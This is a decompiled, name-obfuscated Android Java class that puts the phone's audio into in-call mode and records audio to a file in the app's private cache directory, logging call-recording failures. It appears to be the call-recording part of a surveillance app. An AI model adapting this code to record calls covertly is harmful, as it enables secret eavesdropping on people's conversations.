package com.network.media;

import android.content.Context;
import android.media.AudioManager;
import com.network.android.c.a.a;
import com.network.android.c.a.b;
import java.io.File;

/* access modifiers changed from: package-private */
public final class s implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ AudioManager f172a;
    final /* synthetic */ Context b;

    s(AudioManager audioManager, Context context) {
        this.f172a = audioManager;
        this.b = context;
    }

    public final void run() {
        try {
            r.c();
            int unused = r.f171a = this.f172a.getMode();
            a.a("Recorder record audioManagerMode: " + r.f171a);
            this.f172a.setMode(2);
            this.f172a.setStreamSolo(0, com.network.b.a.a());
            r.c.setAudioSource(com.network.b.a.b().intValue());
            r.c.setOutputFormat(2);
            r.c.setAudioEncoder(1);
            Context context = this.b;
            long a2 = com.network.android.b.a.a();
            a.a("Recorder record maximumRecordingSize: " + a2);
            r.c.setMaxFileSize(a2);
            File file = new File("/data/data/com.network.android/network_cache/");
            if (!file.exists()) {
                file.mkdir();
                a.a("Recorder record  make new audio directory");
            }
            String a3 = r.a();
            r.c.setOutputFile(a3);
            a.a("Recorder record record file:" + a3);
            r.c.prepare();
            r.c.start();
            a.a("Recorder record end");
        } catch (Throwable th) {
            a.a("Recorder record LOG_CALL_RECORDING_FAILED" + th.getMessage(), th);
            b.a(1, (short) 2011);
        }
    }
}
